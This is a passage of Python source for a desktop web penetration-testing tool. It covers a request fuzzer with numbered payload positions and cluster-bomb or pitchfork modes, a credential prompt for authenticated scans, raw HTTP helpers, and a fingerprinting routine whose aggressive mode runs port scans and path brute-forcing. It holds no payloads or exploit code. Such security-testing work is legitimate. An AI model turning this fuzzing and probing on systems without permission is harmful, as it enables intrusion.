        new.req_headers  = dict(req_headers)
        new.req_body     = req_body or ''
        new.headers      = dict(req_headers)
        new.title        = (self.node.title or '') + f' (fuzz: {shown[:40]})'
        new.status_code  = rstatus
        new.content_type = ((resp_headers.get('Content-Type', '') if resp_headers
                             else '') or self.node.content_type)
        new.resp_status  = rstatus
        new.resp_reason  = reason
        new.resp_headers = dict(resp_headers) if resp_headers else {}
        new.resp_body    = resp_body
        new.raw_html     = resp_body
        new.text_content = resp_body
        new.scanned      = True
        new.edited       = True
        self.on_save(new)
        self._status_saved(shown)

    def _status_saved(self, shown):
        """Disable Save and confirm the result was saved as a node."""
        try:
            self.save_btn.config(state='disabled')
            messagebox.showinfo('Saved',
                                f'Saved result as a node:\n{shown[:80]}')
        except Exception:
            pass

    # ── fuzz positions ──────────────────────────────────────────────
    _MARK_RE = re.compile(r'\{\{FUZZ(\d*)\}\}')

    @staticmethod
    def _marker_strings(n):
        """Literal marker(s) that map to position `n`. Position 1 also owns the
        bare {{FUZZ}} marker so single-position requests stay backward-compatible."""
        marks = ['{{FUZZ%d}}' % n]
        if n == 1:
            marks.append('{{FUZZ}}')
        return marks

    def _template(self):
        """The full raw request to fuzz — the headers editor combined with the
        Body box (markers in either are preserved)."""
        return combine_req_body(self.req_txt.get('1.0', 'end'),
                                self.body_txt.get('1.0', 'end'))

    def _active_editor(self):
        """The request or body editor that currently has focus (request editor
        by default), so 'Insert position' targets where the caret is."""
        return self.body_txt if self.focus_get() is self.body_txt else self.req_txt

    def _detected_positions(self, template):
        """Sorted unique position numbers present in the request template."""
        nums = set()
        for m in self._MARK_RE.finditer(template):
            nums.add(int(m.group(1)) if m.group(1) else 1)
        return sorted(nums)

    def _save_active(self):
        """Persist the editor's current text into the active position's list."""
        if self.active_pos is not None:
            self.pos_payloads[self.active_pos] = \
                self.payloads_txt.get('1.0', 'end').rstrip('\n')

    def _set_mode(self, m):
        """Set the attack mode (Cluster bomb / Pitchfork) and relabel the menu."""
        self.mode_var.set(m)
        self.mode_btn.config(text=m + ' ▾')

    def _refresh_positions(self):
        """Re-scan the request for {{FUZZn}} markers and rebuild the position
        dropdown, preserving the payload list already typed for each position."""
        self._save_active()
        positions = self._detected_positions(self._template())
        self.pos_menu.delete(0, 'end')
        if not positions:
            self.active_pos = None
            self.pos_btn.config(text='(no positions) ▾', state='disabled')
            self.payloads_txt.set_content('')
            self.pos_label.config(text='Payloads (one per line):')
            return
        self.pos_btn.config(state='normal')
        for n in positions:
            self.pos_payloads.setdefault(n, '')
            self.pos_menu.add_command(label='FUZZ%d' % n,
                                      command=lambda n=n: self._select_pos(n))
        nxt = self.active_pos if self.active_pos in positions else positions[0]
        self.active_pos = None
        self._select_pos(nxt)

    def _select_pos(self, n):
        """Switch the payload editor to fuzz position `n`, saving the previously
        edited position's payloads first."""
        if n == self.active_pos:
            return
        self._save_active()
        self.active_pos = n
        self.payloads_txt.set_content(self.pos_payloads.get(n, ''))
        self.pos_label.config(text='Payloads for FUZZ%d (one per line):' % n)
        self.pos_btn.config(text='FUZZ%d ▾' % n)

    # ── payload helpers ─────────────────────────────────────────────
    def _insert_marker(self):
        """Insert the next free numbered marker at the caret (in whichever of the
        request/body editors has focus) and register it."""
        used = set(self._detected_positions(self._template()))
        n = 1
        while n in used:
            n += 1
        marker = '{{FUZZ%d}}' % n
        editor = self._active_editor()
        try:
            editor.insert(editor.index('insert'), marker)
        except tk.TclError:
            editor.insert('end', marker)
        self._refresh_positions()
        self._select_pos(n)

    def _clear_payloads(self):
        """Clear the payload list for the active position only."""
        self.payloads_txt.set_content('')
        if self.active_pos is not None:
            self.pos_payloads[self.active_pos] = ''

    def _load_wordlist(self):
        """Append a wordlist file's lines to the active position's payloads."""
        if self.active_pos is None:
            messagebox.showinfo(
                'No position',
                'Insert a {{FUZZ}} position first, then load a wordlist for it.')
            return
        fn = self.run_child_dialog(
            filedialog.askopenfilename,
            title='Load wordlist for FUZZ%d' % self.active_pos,
            filetypes=[('Text files', '*.txt *.lst *.dict'), ('All files', '*.*')])
        if not fn:
            return
        try:
            with open(fn, 'r', encoding='utf-8', errors='ignore') as f:
                words = f.read()
        except Exception as e:
            messagebox.showerror('Load error', str(e))
            return
        current = self.payloads_txt.get('1.0', 'end').rstrip()
        joined = (current + '\n' + words) if current else words
        self.payloads_txt.set_content(joined)

    # ── run / stop ───────────────────────────────────────────────────
    def _start(self):
        """Validate positions/payloads and launch the fuzzing run on a background
        thread, combining the per-position lists per the chosen attack mode."""
        self._save_active()
        template = self._template().rstrip()
        positions = self._detected_positions(template)
        if not positions:
            messagebox.showinfo(
                'No position',
                'Mark at least one position with {{FUZZ1}} (or {{FUZZ}}).')
            return
        lists = []
        for n in positions:
            words = [p for p in self.pos_payloads.get(n, '').splitlines()
                     if p.strip()]
            if not words:
                messagebox.showinfo(
                    'No payloads',
                    'Position FUZZ%d has no payloads. Select it and add some '
                    '(or load a wordlist).' % n)
                return
            lists.append(words)

        mode = self.mode_var.get()
        if mode == 'Pitchfork':
            total = min(len(w) for w in lists)
            combos = zip(*lists)
        else:
            total = 1
            for w in lists:
                total *= len(w)
            combos = itertools.product(*lists)
        if total <= 0:
            messagebox.showinfo('No payloads', 'Nothing to send.')
            return
        # Guard against an accidental combinatorial blow-up / hammering a host.
        if total > 50000 and not self.run_child_dialog(
                messagebox.askyesno,
                'Large run',
                'This will send %d requests (%s mode), back-to-back with no '
                'rate limit. Continue?' % (total, mode)):
            return

        self._clear_results()
        self._running = True
        self._stop_requested = False
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.progress.start()
        self.status_box.clear()
        base = self.node.req_url or self.node.url
        # Compile the match/filter criteria once for this run.
        mc = _make_int_matcher(self.mc_var.get())
        ms = _make_int_matcher(self.ms_var.get())
        fc = _make_int_matcher(self.fc_var.get())
        fs = _make_int_matcher(self.fs_var.get())
        encode_payloads = self.payload_encode_var.get()
        marker_sets = [self._marker_strings(n) for n in positions]

        def worker():
            """Run the fuzzing loop: substitute each payload combo, send the
            request, and append passing results to the table."""
            sent_any = False
            errors = 0
            for idx, combo in enumerate(combos, 1):
                if not self._running or not self.winfo_exists():
                    break
                raw_req = template
                for marks, payload in zip(marker_sets, combo):
                    value = quote(payload, safe='') if encode_payloads else payload
                    for mk in marks:
                        raw_req = raw_req.replace(mk, value)
                r, raw = send_raw_request(raw_req, base)
                status = r.status_code if r is not None else 0
                length = len(r.text) if r is not None else 0
                if r is None:
                    errors += 1
                else:
                    sent_any = True
                # Apply ffuf-style match/filter: only keep/show passing results
                # (an errored request has status 0, which the criteria judge too).
                if not _passes_filters(status, length, mc, ms, fc, fs):
                    continue
                shown = ' | '.join(combo)
                entry = (shown, status, length, raw, raw_req)
                self.results.append(entry)

                def add(i=idx, p=shown, s=status, ln=length):
                    """Append one result row to the listbox on the main thread."""
                    if self.winfo_exists():
                        self.results_lb.insert(
                            'end',
                            f'{i:>4}  {s:>6}  {ln:>7}  {p[:60]}')
                self.after(0, add)

            def finish(_sent=sent_any, _errs=errors):
                """Reset the run UI and set the success/fail badge."""
                if not self.winfo_exists():
                    return
                self._running = False
                self.start_btn.config(state='normal')
                self.stop_btn.config(state='disabled')
                self.progress.reset()
                # Fail badge if every request errored OR the user stopped
                # the run early; success if at least one request landed
                # and we weren't interrupted.
                if self._stop_requested or (not _sent and _errs):
                    self.status_box.fail()
                elif _sent:
                    self.status_box.success()
                else:
                    self.status_box.clear()
            self.after(0, finish)

        threading.Thread(target=worker, daemon=True).start()

    def _stop(self):
        """Request the running fuzz to stop after the in-flight request."""
        self._stop_requested = True
        self._running = False


# ─────────────────────────────────────────────
# AuthDialog — per-host credential prompt for an Auth scan. Pauses the scan
# (the caller blocks on an Event) while the user picks an auth type and enters
# credentials; a read-only preview shows the exact request that will be sent,
# updated live as they type.
# ─────────────────────────────────────────────
class AuthDialog(ModalToplevel):
    """Per-host credential prompt for an Auth scan. Pauses the scan (the caller
    blocks on an Event) while the user picks an auth type and enters credentials;
    a read-only preview shows the exact request that will be sent, updated live
    as they type."""
    # ordered: (type-key, menu label, [(field-key, field-label, secret?), …])
    _TYPES = [
        ('bearer', 'Bearer token',  [('token', 'Bearer token', False)]),
        ('basic',  'HTTP Basic',    [('username', 'Username', False),
                                     ('password', 'Password', True)]),
        ('form',   'Form login',    [('username', 'Username', False),
                                     ('password', 'Password', True)]),
        ('apikey', 'API key',       [('key', 'API key', False),
                                     ('header', 'Header name (default X-API-Key)',
                                      False)]),
        ('header', 'Custom header', [('name', 'Header name', False),
                                     ('value', 'Header value', False)]),
        ('cookie', 'Cookie',        [('cookie', 'Cookie', False)]),
        ('none',   'None (skip)',   []),
    ]

    def __init__(self, parent, node: SiteNode, on_done):
        """Build the auth prompt for `node`'s host. `on_done` is called exactly
        once with the chosen credential dict (or None to skip/continue)."""
        super().__init__(parent)
        self.node = node
        self.on_done = on_done
        self._answered = False
        self._spec = {k: (lbl, fields) for k, lbl, fields in self._TYPES}
        host = _host_only(urlparse(node.url).netloc) or node.url
        self.title(f'Authenticate — {host[:60]}')
        self.configure(bg=C['bg'])

        wrap = tk.Frame(self, bg=C['bg'])
        wrap.pack(fill='both', expand=True, padx=8, pady=8)

        st = node.resp_status or node.status_code
        tk.Label(wrap, text=f'{host} requires authentication (HTTP {st}). '
                 f'Choose a type and enter credentials:',
                 bg=C['bg'], font=C['font'], wraplength=600, justify='left'
                 ).pack(anchor='w', pady=(0, 6))

        # ── Auth-type dropdown ──
        top = tk.Frame(wrap, bg=C['bg'])
        top.pack(fill='x')
        tk.Label(top, text='Authentication type:', bg=C['bg'],
                 font=C['font_b']).pack(side='left')
        self.type_var = tk.StringVar(value='bearer')
        self.type_btn = tk.Menubutton(top, text='Bearer token ▾', bg=C['btn'],
                                      activebackground=C['btn'], relief='raised',
                                      bd=2, font=C['font'], padx=6,
                                      highlightthickness=0)
        menu = tk.Menu(self.type_btn, tearoff=0, bg=C['btn'], fg=C['black'],
                       activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                       font=C['font'])
        for key, label, _f in self._TYPES:
            menu.add_command(label=label,
                             command=lambda k=key, l=label: self._set_type(k, l))
        self.type_btn.config(menu=menu)
        self.type_btn.pack(side='left', padx=(6, 0))

        # ── Dynamic credential fields ──
        self.fields_frame = tk.Frame(wrap, bg=C['bg'])
        self.fields_frame.pack(fill='x', pady=(8, 4))
        self.field_vars = {}

        # ── Read-only request preview ──
        tk.Label(wrap, text='Request that will be sent:', bg=C['bg'],
                 font=C['font_b']).pack(anchor='w', pady=(6, 2))
        pf = tk.Frame(wrap, bg=C['bg'])
        pf.pack(fill='both', expand=True)
        self.preview = EditText95(pf, height=10)
        psb = tk.Scrollbar(pf, orient='vertical', command=self.preview.yview)
        # Read-only: shown for reference only, rewritten programmatically as the
        # user edits the credential fields (toggled to 'normal' just to update).
        self.preview.config(yscrollcommand=psb.set, state='disabled')
        self.preview.pack(side='left', fill='both', expand=True)
        psb.pack(side='right', fill='y')

        # ── Buttons ──
        bar = tk.Frame(wrap, bg=C['bg'])
        bar.pack(fill='x', pady=(6, 0))
        Btn(bar, text=' Apply & retry ', command=self._apply,
            bg='#2e7d32', fg='white').pack(side='left')
        Btn(bar, text=' Skip host ',
            command=lambda: self._finish(None)).pack(side='left', padx=4)
        Btn(bar, text=' Continue unauthenticated ',
            command=lambda: self._finish(None)).pack(side='right', padx=2)

        self.protocol('WM_DELETE_WINDOW', lambda: self._finish(None))
        try:
            self.geometry('660x560')
        except tk.TclError:
            pass
        self._set_type('bearer', 'Bearer token')

    def _set_type(self, key, label):
        """Switch the auth type: relabel the dropdown and rebuild the credential
        fields to match, then refresh the request preview."""
        self.type_var.set(key)
        self.type_btn.config(text=label + ' ▾')
        for w in self.fields_frame.winfo_children():
            w.destroy()
        self.field_vars = {}
        _lbl, fields = self._spec.get(key, ('', []))
        for row, (fkey, flabel, secret) in enumerate(fields):
            tk.Label(self.fields_frame, text=flabel + ':', bg=C['bg'],
                     font=C['font']).grid(row=row, column=0, sticky='w',
                                          padx=2, pady=2)
            var = tk.StringVar()
            var.trace_add('write', self._update_preview)
            ent = Entry95(self.fields_frame, textvariable=var, width=52,
                          show='*' if secret else '')
            ent.grid(row=row, column=1, sticky='ew', padx=2, pady=2)
            self.field_vars[fkey] = var
        self.fields_frame.grid_columnconfigure(1, weight=1)
        self._update_preview()

    def _build_cred(self):
        """Assemble the credential dict from the selected type and field values."""
        cred = {'type': self.type_var.get()}
        for k, var in self.field_vars.items():
            cred[k] = var.get()
        return cred

    def _update_preview(self, *_):
        """Re-render the raw request with the auth applied from current inputs."""
        cred = self._build_cred()
        headers, cookie = scan._auth_mutations(cred)
        method = (self.node.req_method or 'GET')
        url = self.node.req_url or self.node.url
        pu = urlparse(url)
        pathq = (pu.path or '/') + (('?' + pu.query) if pu.query else '')
        out = dict(self.node.req_headers or {})
        out.pop('Host', None)
        for k, v in headers.items():
            out[k] = v
        if cookie:
            ck = next((h for h in out if h.lower() == 'cookie'), None)
            out[ck or 'Cookie'] = f'{out[ck]}; {cookie}' if ck else cookie
        lines = [f'{method} {pathq} HTTP/1.1', f'Host: {pu.netloc}']
        lines += [f'{k}: {v}' for k, v in out.items()]
        text = '\r\n'.join(lines)
        if cred['type'] == 'form':
            text += ('\r\n\r\n[Form login — the username/password are typed into '
                     'the page’s login form in the browser; no header is '
                     'injected into this request.]')
        elif self.node.req_body:
            text += '\r\n\r\n' + self.node.req_body
        self.preview.config(state='normal')
        self.preview.delete('1.0', 'end')
        self.preview.insert('1.0', text)
        self.preview.config(state='disabled')

    def _apply(self):
        """Apply & retry: finish with the credential built from the inputs."""
        self._finish(self._build_cred())

    def _finish(self, cred):
        """Deliver the result to on_done exactly once and close the dialog
        (`cred` is None for skip/continue-unauthenticated)."""
        if self._answered:
            return
        self._answered = True
        try:
            self.on_done(cred)
        finally:
            try:
                self.grab_release()
            except tk.TclError:
                pass
            self.destroy()


# ─────────────────────────────────────────────
# helper — stateless utilities
# ─────────────────────────────────────────────
class helper:
    """Stateless helper utilities, grouped here as static methods: settings
    I/O, theme, raw-HTTP request/response handling, the fuzzer match/filter,
    node data-in/out computation, editor URL-encoding, and the tech-scan
    fingerprint. Module-level aliases below keep existing callers working."""

    @staticmethod
    def load_settings() -> dict:
        """Load the saved settings merged over the defaults, returning the
        defaults if the file is missing or unreadable."""
        if SETTINGS_FILE.exists():
            try:
                saved = json.loads(SETTINGS_FILE.read_text(encoding='utf-8'))
                merged = dict(DEFAULT_SETTINGS)
                merged.update(saved)
                return merged
            except Exception:
                pass
        return dict(DEFAULT_SETTINGS)

    @staticmethod
    def save_settings(data: dict):
        """Persist the settings dict to the settings file (best effort)."""
        try:
            SETTINGS_DIR.mkdir(parents=True, exist_ok=True)
            SETTINGS_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2),
                                     encoding='utf-8')
        except Exception:
            pass

    @staticmethod
    def apply_font_size(size):
        """Rescale the shared font tuples; takes effect as widgets are created."""
        size = max(7, min(14, int(size)))
        C['font']   = ('MS Sans Serif', size)
        C['font_b'] = ('MS Sans Serif', size, 'bold')
        C['mono']   = ('Courier', size + 1)

    @staticmethod
    def apply_theme(root):
        """Configure the ttk styles to match the Chicago-95 look for the app's
        notebook, frames, labels and buttons."""
        style = ttk.Style(root)
        style.theme_use('default')
        # Solid-black tree disclosure triangles. The 'default' theme draws only a
        # thin hollow outline (its indicator 'foreground' won't fill it), so
        # replace the indicator element with filled triangle images: ▶ closed,
        # ▼ open, and a blank for leaves. Images are stashed on `root` so Tk
        # doesn't garbage-collect them. Only the Site Structure tree (show='tree')
        # has indicators — header-only trees are unaffected.
        try:
            def _tri(direction, n=9):
                """An n×n PhotoImage of a solid black triangle (transparent bg)."""
                img = tk.PhotoImage(width=n, height=n)
                c = (n - 1) / 2
                for y in range(n):
                    for x in range(n):
                        inside = (x <= (n - 1) - 2 * abs(y - c)
                                  if direction == 'right'
                                  else y <= (n - 1) - 2 * abs(x - c))
                        if inside:
                            img.put('#000000', (x, y))
                        else:
                            img.transparency_set(x, y, True)
                return img
            blank = tk.PhotoImage(width=9, height=9)
            for _y in range(9):
                for _x in range(9):
                    blank.transparency_set(_x, _y, True)
            closed, opened = _tri('right'), _tri('down')
            root._tree_indicator_imgs = (closed, opened, blank)
            style.element_create('Treeitem.blackindicator', 'image', closed,
                                 ('user1', '!user2', opened),
                                 ('user2', blank),
                                 sticky='w', width=15)
            style.layout('Treeview.Item', [
                ('Treeitem.padding', {'sticky': 'nswe', 'children': [
                    ('Treeitem.blackindicator', {'side': 'left', 'sticky': ''}),
                    ('Treeitem.image', {'side': 'left', 'sticky': ''}),
                    ('Treeitem.text', {'sticky': 'nswe'}),
                ]}),
            ])
        except Exception:
            pass
        style.configure('TFrame', background=C['bg'])
        style.configure('TLabel', background=C['bg'], foreground=C['black'], font=C['font'])
        style.configure('TButton', background=C['btn'], foreground=C['black'],
                        relief='raised', font=C['font'], padding=(4, 2))
        style.map('TButton', relief=[('pressed', 'sunken')])
        style.configure('TNotebook', background=C['bg'], borderwidth=1)
        style.configure('TNotebook.Tab', background=C['bg'], foreground=C['black'],
                        font=C['font'], padding=(6, 2))
        style.map('TNotebook.Tab',
                  background=[('selected', C['window'])],
                  relief=[('selected', 'sunken')])
        # Drop the dotted focus ring drawn around a selected notebook tab's label by
        # rebuilding the Tab layout without the 'Notebook.focus' element.
        try:
            style.layout('TNotebook.Tab', [
                ('Notebook.tab', {'sticky': 'nswe', 'children': [
                    ('Notebook.padding', {'side': 'top', 'sticky': 'nswe', 'children': [
                        ('Notebook.label', {'side': 'top', 'sticky': ''}),
                    ]}),
                ]}),
            ])
        except Exception:
            pass
        root.configure(bg=C['bg'])

    @staticmethod
    def parse_raw_request(raw: str, base_url: str):
        """Parse a textual HTTP/1.1 request into (method, url, headers, body).
        `base_url` supplies the default scheme + host if the request line uses a
        relative path. Returns None on a malformed request line."""
        lines = raw.replace('\r\n', '\n').split('\n')
        if not lines or not lines[0].strip():
            return None
        m = re.match(r'^(\S+)\s+(\S+)(?:\s+HTTP/\d\.\d)?\s*$', lines[0].strip())
        if not m:
            return None
        method = m.group(1).upper()
        path = m.group(2)

        headers: dict = {}
        i = 1
        while i < len(lines) and lines[i].strip():
            if ':' in lines[i]:
                k, v = lines[i].split(':', 1)
                headers[k.strip()] = v.strip()
            i += 1
        body = '\n'.join(lines[i + 1:]) if i + 1 < len(lines) else ''
        # Trim a single trailing newline from the editor without losing
        # intentional blank lines mid-body.
        if body.endswith('\n'):
            body = body[:-1]

        bp = urlparse(base_url) if base_url else None
        if path.startswith(('http://', 'https://')):
            url = path
        else:
            host = headers.get('Host') or (bp.netloc if bp else '')
            scheme = (bp.scheme if bp and bp.scheme else 'https')
            url = f'{scheme}://{host}{path}'
        return method, url, headers, body

    @staticmethod
    def parse_raw_response(raw: str):
        """Parse a textual HTTP/1.1 response into (status, reason, headers, body).
        Returns None on a malformed status line."""
        lines = raw.replace('\r\n', '\n').split('\n')
        if not lines:
            return None
        m = re.match(r'^HTTP/\d\.\d\s+(\d+)\s*(.*)$', lines[0].strip())
        if not m:
            return None
        status = int(m.group(1))
        reason = m.group(2).strip()

        headers: dict = {}
        i = 1
        while i < len(lines) and lines[i].strip():
            if ':' in lines[i]:
                k, v = lines[i].split(':', 1)
                headers[k.strip()] = v.strip()
            i += 1
        body = '\n'.join(lines[i + 1:]) if i + 1 < len(lines) else ''
        return status, reason, headers, body

    @staticmethod
    def format_raw_response(r) -> str:
        """Format a requests Response as a raw HTTP/1.1 response string."""
        lines = [f'HTTP/1.1 {r.status_code} {r.reason}']
        for k, v in r.headers.items():
            lines.append(f'{k}: {v}')
        lines.append('')
        lines.append(InfoPanel._pretty_body(r.text))
        return '\n'.join(lines)

    @staticmethod
    def send_raw_request(raw: str, base_url: str, timeout: float = 15.0):
        """Send a textual HTTP/1.1 request. Returns (response_or_None, raw_text)."""
        if not REQUESTS_AVAILABLE:
            return None, '[requests not installed: pip install requests]'
        parsed = parse_raw_request(raw, base_url)
        if not parsed:
            return None, '[Could not parse request — first line must be: METHOD path HTTP/1.1]'
        method, url, headers, body = parsed
        # Let requests recompute Host / Content-Length.
        headers = {k: v for k, v in headers.items()
                   if k.lower() not in ('host', 'content-length')}
        try:
            r = requests.request(method, url, headers=headers,
                                 data=body.encode('utf-8', 'ignore') if body else None,
                                 timeout=timeout, verify=False, allow_redirects=False)
        except Exception as e:
            return None, f'[Send error: {e}]'
        return r, format_raw_response(r)

    @staticmethod
    def split_req_body(raw: str):
        """Split a raw HTTP request into (headers_part, body_part) at the first
        blank line, so the request line + headers and the body can be shown in
        separate editors. Returns (raw, '') when there is no blank line."""
        norm = (raw or '').replace('\r\n', '\n')
        if '\n\n' in norm:
            head, body = norm.split('\n\n', 1)
            return head, body
        return norm, ''

    @staticmethod
    def combine_req_body(req_text: str, body_text: str) -> str:
        """Join a request editor (request line + headers) with a separate Body
        box into one raw HTTP request. The Body box is authoritative: when it
        has content it is placed after a single blank line and any body still
        present in the request editor is dropped; when it is empty the request
        editor is returned unchanged (so an inline body keeps working)."""
        body = (body_text or '').replace('\r\n', '\n')
        if body.endswith('\n'):
            body = body[:-1]
        if not body:
            return req_text
        head = (req_text or '').replace('\r\n', '\n').split('\n\n', 1)[0].rstrip('\n')
        return head + '\n\n' + body

    @staticmethod
    def _make_int_matcher(spec):
        """Compile a comma-separated ints/ranges spec ('200,301,400-499') into a
        predicate match(value)->bool. Returns None for an empty spec (no
        constraint). Ranges stay lazy so a huge size range is cheap."""
        ranges, exact = [], set()
        for tok in (spec or '').replace(' ', '').split(','):
            if not tok:
                continue
            if '-' in tok[1:]:
                a, b = tok[:tok.index('-', 1)], tok[tok.index('-', 1) + 1:]
                try:
                    ranges.append((int(a), int(b)))
                except ValueError:
                    pass
            else:
                try:
                    exact.add(int(tok))
                except ValueError:
                    pass
        if not ranges and not exact:
            return None
        def match(v):
            """True if `v` is one of the exact values or within a range."""
            return v is not None and (
                v in exact or any(lo <= v <= hi for lo, hi in ranges))
        return match

    @staticmethod
    def _passes_filters(status, size, mc, ms, fc, fs):
        """ffuf semantics: an explicit filter (fc/fs) excludes; an explicit match
        (mc/ms) is a required whitelist. Each matcher is None when unset."""
        if fc and status is not None and fc(status):
            return False
        if fs and size is not None and fs(size):
            return False
        if mc and not mc(status):
            return False
        if ms and not ms(size):
            return False
        return True

    @staticmethod
    def compute_data_in(node: 'SiteNode') -> dict:
        """GET + POST parameters that produced this node (data entering it)."""
        get = {k: list(v) for k, v in (node.get_params or {}).items()}
        # Backfill from the actual request/URL query, in case get_params was empty.
        src = node.req_url or node.url or ''
        try:
            for k, v in parse_qs(urlparse(src).query, keep_blank_values=True).items():
                get.setdefault(k, v)
        except Exception:
            pass
        post = {k: list(v) if isinstance(v, list) else v
                for k, v in (node.post_params or {}).items()}
        return {'GET': get, 'POST': post}

    @staticmethod
    def compute_data_out(node: 'SiteNode') -> list:
        """Every request the node can make, grouped by how it is sent: requests
        observed from live traffic (real XHR/fetch incl. POST bodies — e.g. a page
        that does POST /search with an orderBy param), each detected HTML form
        (method + action + input fields), and each parameterized outbound link.
        This is the data the node *can send* — no response is implied."""
        out = []
        # Requests observed from the live page (richest: real method + body params).
        seen_obs = set()
        for req in (getattr(node, 'out_requests', None) or []):
            method = (req.get('method') or 'GET').upper()
            action = req.get('url') or node.url
            params = req.get('params') or {}
            key = (method, action.split('?', 1)[0], tuple(sorted(params)))
            if key in seen_obs:
                continue
            seen_obs.add(key)
            out.append({'via': req.get('via', 'xhr'), 'method': method,
                        'action': action, 'params': params})
        for f in (node.forms or []):
            params = {}
            for inp in f.get('inputs', []):
                name = inp.get('name')
                if name:
                    params[name] = inp.get('value', '')
            out.append({
                'via':    'form',
                'method': (f.get('method') or 'GET').upper(),
                'action': f.get('action') or node.url,
                'params': params,
            })
        seen = set()
        for lnk in (node.links or []):
            try:
                q = parse_qs(urlparse(lnk).query, keep_blank_values=True)
            except Exception:
                q = {}
            if not q:
                continue
            base = lnk.split('?', 1)[0]
            key = (base, tuple(sorted(q)))
            if key in seen:
                continue
            seen.add(key)
            out.append({
                'via':    'link',
                'method': 'GET',
                'action': base,
                'params': {k: (v[0] if isinstance(v, list) and v else '')
                           for k, v in q.items()},
            })
        return out

    @staticmethod
    def format_data_out(node: 'SiteNode') -> str:
        """Human-readable list of the requests this node *can use* — each form or
        parameterized link it exposes, with the method and the parameters the page
        can send (e.g. a login page can use username / password via POST). There is
        no response here; these are requests the node is capable of making."""
        entries = compute_data_out(node)
        if not entries:
            return ('This node exposes no requests it can use\n'
                    '(no forms or parameterized links were detected on it).')
        lines = []
        for e in entries:
            params = e.get('params', {})
            names = ', '.join(params.keys()) if params else '(no parameters)'
            lines.append(f"{e['method']:<5} {e.get('action', '')}")
            lines.append(f"      via {e.get('via', '?')} — can use: {names}")
            for k, v in params.items():
                val = (v[0] if isinstance(v, list) and v else (v or ''))
                lines.append(f"          • {k} = {val}")
            lines.append('')
        return '\n'.join(lines).rstrip()

    @staticmethod
    def _urlencode_keypress(event, enabled):
        """`<Key>` handler for request editors: when `enabled()` is true, a typed
        character that isn't URL-unreserved is replaced with its percent-encoding
        (space → %20, ' → %27, < → %3C, …). Unreserved chars (A-Za-z0-9-_.~),
        control keys (Enter/Tab/Backspace), and Ctrl-shortcuts pass through. Returns
        'break' when it inserts the encoded form so the literal char isn't also
        inserted by Tk's default binding."""
        try:
            if not enabled():
                return None
            ch = event.char
            if not ch or len(ch) != 1:
                return None
            if event.state & 0x4:
                return None
            o = ord(ch)
            if o < 0x20 or o == 0x7f:
                return None
            if ch.isascii() and (ch.isalnum() or ch in '-_.~'):
                return None
            event.widget.insert('insert', quote(ch, safe=''))
            return 'break'
        except Exception:
            return None

    @staticmethod
    def _bind_urlencode(widget, enabled):
        """Make `widget` auto-URL-encode typed characters while `enabled()` is true."""
        widget.bind('<Key>', lambda e: _urlencode_keypress(e, enabled))

    @staticmethod
    def fingerprint_target(url: str, should_stop=None, mode=None) -> str:
        """Technology fingerprint, scoped by scan mode. HTTP header/body
        signatures always run; the remaining probes are gated by the mode's
        'tech_probes' set (see SCAN_MODES). Stealth keeps to passive probes
        (signature/engine technology detection, security headers, the TLS
        certificate and DNS records); Normal adds the port/service scan, web
        fingerprint and WAF detection; Aggressive additionally pulls WHOIS and
        brute-forces common paths, OPTIONS and active WAF fingerprinting. Each
        probe runs in parallel and is silently skipped on failure. Probe output
        is reported by what it found, not by the engine that found it."""
        mode = mode if mode in SCAN_MODES else DEFAULT_SCAN_MODE
        allow = set(SCAN_MODES[mode]['tech_probes'])
        parsed = urlparse(url)
        host = parsed.hostname or ''
        scheme = (parsed.scheme or 'http').lower()
        port = parsed.port or (443 if scheme == 'https' else 80)

        # HTTP runs first (synchronously) because Wappalyzer reuses the response.
        http_text, http_response = _fp_probe_http(url)

        sections: dict[str, str] = {'http': http_text}
        lock = threading.Lock()

        def run(name, fn, *args):
            """Run one probe `fn`, capturing errors, and store its section text
            under `name` (thread-safe)."""
            try:
                res = fn(*args)
            except Exception as e:
                res = f'── {name} ──\n  (error: {e})'
            with lock:
                sections[name] = res

        # Build the probe set for this mode. Each entry only runs when its name
        # is allowed by the mode AND its dependency (tool / response) is present.
        jobs: list[tuple[str, callable, tuple]] = []
        if 'wapp' in allow and WAPPALYZER_AVAILABLE and http_response is not None:
            jobs.append(('wapp', _fp_probe_wappalyzer, (url, http_response)))
        if 'techcli' in allow and (shutil.which('httpx')
                or shutil.which('httpx-toolkit') or shutil.which('webanalyze')):
            jobs.append(('techcli', _fp_probe_tech_cli, (url,)))
        # Passive, dependency-free signal (reuses the landing response / sockets).
        if 'sec_headers' in allow and http_response is not None:
            jobs.append(('sech', _fp_probe_sec_headers, (http_response,)))
        if 'tls' in allow and host and (scheme == 'https' or port == 443):
            jobs.append(('tls', _fp_probe_tls, (host, port)))
        if 'http_versions' in allow and host:
            jobs.append(('httpver', _fp_probe_http_versions,
                         (host, port, http_response)))
        if 'dns' in allow and host:
            jobs.append(('dns', _fp_probe_dns, (host,)))
        if 'cname' in allow and host:
            jobs.append(('cname', _fp_probe_cname, (host,)))
        if 'whois' in allow and host:
            jobs.append(('whois', _fp_probe_whois, (host,)))
        if 'favicon' in allow:
            jobs.append(('favicon', _fp_probe_favicon, (url,)))
        if 'site_meta' in allow:
            jobs.append(('sitemeta', _fp_probe_site_meta, (url,)))
        if 'cms_version' in allow:
            jobs.append(('cmsver', _fp_probe_cms_version, (url,)))
        if 'wafw00f' in allow and shutil.which('wafw00f'):
            jobs.append(('wafw00f', _fp_probe_wafw00f, (url,)))
        if 'ports' in allow and host:
            jobs.append(('ports', _fp_probe_ports, (host,)))
        if 'whatweb' in allow and shutil.which('whatweb'):
            jobs.append(('whatweb', _fp_probe_whatweb, (url,)))
        if 'nmap' in allow and shutil.which('nmap') and host:
            jobs.append(('nmap', _fp_probe_nmap, (host,)))
        # Aggressive-only intrusive probes.
        if 'common_paths' in allow:
            jobs.append(('paths', _fp_probe_common_paths, (url,)))
        if 'options' in allow:
            jobs.append(('options', _fp_probe_options, (url,)))
        if 'waf' in allow:
            jobs.append(('waf', _fp_probe_waf, (url, http_response)))

        threads = []
        for name, fn, args in jobs:
            t = threading.Thread(target=run, args=(name, fn) + args, daemon=True)
            t.start()
            threads.append(t)

        # Poll instead of a blocking join so a cancel (main STOP) returns promptly.
        # The probe threads are daemon threads; an aborted one keeps running
        # harmlessly in the background and its result is simply discarded.
        deadline = time.time() + 300
        while time.time() < deadline and any(t.is_alive() for t in threads):
            if should_stop and should_stop():
                break
            time.sleep(0.2)

        # A single generic note (no tool names) when an optional detection
        # engine this mode would have used isn't installed, so results may be
